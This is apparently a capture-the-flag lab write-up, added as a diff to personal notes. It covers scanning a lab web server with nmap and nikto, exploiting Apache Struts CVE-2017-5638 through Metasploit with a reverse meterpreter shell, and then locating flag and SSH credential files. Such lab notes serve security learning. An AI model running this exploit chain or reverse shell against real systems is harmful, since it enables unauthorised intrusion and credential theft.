@@ -319,4 +319,117 @@ while True:
 print("the flag: "+ flag)
 ```
 # Day 10: 
-take a breake, need to learn how to use Metaspoil
+
+
+me: 10.8.14.151
+target: 10.10.87.246
+
+nmap
+```
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 22:38 EDT
+[*] Nmap: Nmap scan report for 10.10.87.246
+[*] Nmap: Host is up (0.048s latency).
+[*] Nmap: Not shown: 997 closed ports
+[*] Nmap: PORT    STATE SERVICE VERSION
+[*] Nmap: 22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
+[*] Nmap: 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
+[*] Nmap: 111/tcp open  rpcbind 2-4 (RPC #100000)
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
+```
+## Compromise the web server using Metasploit. What is flag1?
+web url = http://10.10.87.246/showcase.action
+port80
+```console
+msf5 post(multi/gather/tomcat_gather) > db_nmap -p 80 -A 10.10.87.246
+[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 23:07 EDT
+[*] Nmap: Nmap scan report for 10.10.87.246
+[*] Nmap: Host is up (0.052s latency).
+[*] Nmap: PORT   STATE SERVICE VERSION
+[*] Nmap: 80/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+[*] Nmap: |_http-server-header: Apache-Coyote/1.1
+[*] Nmap: | http-title: Santa Naughty and Nice Tracker
+[*] Nmap: |_Requested resource was showcase.action
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 27.74 seconds
+```
+nikto use for scan web app vuln
+```console
+kali@kali:~$ nikto -host 10.10.87.246
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.87.246
++ Target Hostname:    10.10.87.246
++ Target Port:        80
++ Start Time:         2020-05-07 23:05:40 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Root page / redirects to: showcase.action
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Uncommon header 'nikto-added-cve-2017-5638' found, with contents: 42
++ /index.action: Site appears vulnerable to the 'strutshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638).
+me: 10.8.14.151
+```
+As you can se the site is vulnerble to [strutshock](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)
+```console
+$ set LHOST <my ip> # set for reverse
+$ search strut # search for vuln
+$ use 2 # slect vuln
+$ set payload linux/x86/meterpreter/reverse_tcp
+$ set RHOST <target>
+$ set RPOTY <80>
+$ set TARGETURL /showcase.action
+$ exploit
+```
+The flag file is call xxxxxFlag1.txt. Good luck finding it. hint ```find / 2>>/dev/null | grep -i "flag"```
+
+## Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
+```/home/santa/ssh-creds.txt``` 
+
+## Who is on line 148 of the naughty list?
+```console
+
+      \         /   \         /   \         /   \         /
+      _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
+       _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
+      (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
+        | ^ ^ |       | o o |       | a a |       | 6 6 |
+        |     |       |     |       |     |       |     |
+        |     |       |     |       |     |       |     |
+        |  Y  |       |  @  |       |  O  |       |  V  |
+        `._|_.'       `._|_.'       `._|_.'       `._|_.'
+         Dasher        Dancer       Prancer        Vixen
+      \         /   \         /   \         /   \         /
+      _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
+       _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
+      (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
+        | q p |       | @ @ |       | 9 9 |       | d b |
+        |     |       |     |       |     |       |     |
+        |     |       |     |       |  _  |       |     |
+        | \_/ |       |  V  |       | (_) |       |  0  |
+        `._|_.'       `._|_.'       `._|_.'       `._|_.'
+         Comet         Cupid         Donder       Blitzen
+                           \         /
+                           _\/     \/_
+                            _\-'"'-/_
+                           (_,     ,_)
+                             | e e |
+                             |     |
+                        '-.  |  _  |  .-'
+                       --=   |((@))|   =--
+                        .-'  `._|_.'  '-.
+                             Rudolph
+```
+so cute
+```console
+[santa@ip-10-10-166-181 ~]$ ls
+naughty_list.txt  nice_list.txt
+[santa@ip-10-10-166-181 ~]$ cat -n naughty_list.txt | grep XXX
+```
+find out what XXX is GL
+## Who is on line 52 of the nice list?
+```cat -n nice_list.txt | grep XX```
+GL
